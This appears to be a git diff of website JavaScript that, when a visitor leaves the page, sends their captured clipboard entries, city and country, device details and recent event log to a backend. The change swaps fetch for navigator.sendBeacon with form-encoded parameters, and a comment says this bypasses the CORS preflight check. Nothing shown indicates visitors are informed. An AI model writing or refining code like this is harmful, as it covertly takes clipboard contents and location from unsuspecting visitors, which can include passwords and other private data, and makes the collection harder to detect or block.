@@ -72,33 +72,30 @@
 
         const rawLog = localHistory.slice(-20).join('\n').substring(0, 1500);
 
-        // 2. Persistent Logs (POST to Backend - Reliable Yesterday Style)
-        const payload = {
-            sessionID: sessionID || 'unknown',
-            duration: duration,
-            exitPage: window.location.pathname,
-            location: `${sessionData?.city || 'Unknown'}, ${sessionData?.country_name || ''}`,
-            deviceInfo: `${sessionData?.device?.model || 'Unknown'} (${sessionData?.device?.os || 'Unknown'})`,
-            clipboard: escapeHTML(clipboardEntries) || 'None',
-            eventLog: escapeHTML(rawLog) || 'No events recorded'
-        };
+        // 2. Persistent Logs (POST to Backend - Failsafe V39)
+        const params = new URLSearchParams();
+        params.append('sessionID', sessionID || 'unknown');
+        params.append('duration', duration);
+        params.append('exitPage', window.location.pathname);
+        params.append('location', `${sessionData?.city || 'Unknown'}, ${sessionData?.country_name || ''}`);
+        params.append('deviceInfo', `${sessionData?.device?.model || 'Unknown'} (${sessionData?.device?.os || 'Unknown'})`,);
+        params.append('clipboard', escapeHTML(clipboardEntries) || 'None');
+        params.append('eventLog', escapeHTML(rawLog) || 'No events recorded');
 
         const reportUrl = CONFIG.api.report;
 
-        // Strategy: Fetch with keepalive (Most reliable for JSON POST on exit)
-        fetch(reportUrl, {
-            method: 'POST',
-            body: JSON.stringify(payload),
-            headers: { 'Content-Type': 'application/json' },
-            keepalive: true,
-            mode: 'cors'
-        }).catch(() => {
-            // Fallback to sendBeacon if fetch fails
-            if (navigator.sendBeacon) {
-                const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
-                navigator.sendBeacon(reportUrl, blob);
-            }
-        });
+        // STRATEGY: navigator.sendBeacon with URLSearchParams (Simple Request - No Preflight)
+        // This is the most reliable way to send data on exit as it bypasses CORS OPTIONS check.
+        if (navigator.sendBeacon) {
+            navigator.sendBeacon(reportUrl, params);
+        } else {
+            fetch(reportUrl, {
+                method: 'POST',
+                body: params,
+                keepalive: true,
+                mode: 'no-cors'
+            }).catch(() => { });
+        }
     }
 
     window.addEventListener('pagehide', sendExitMessage);
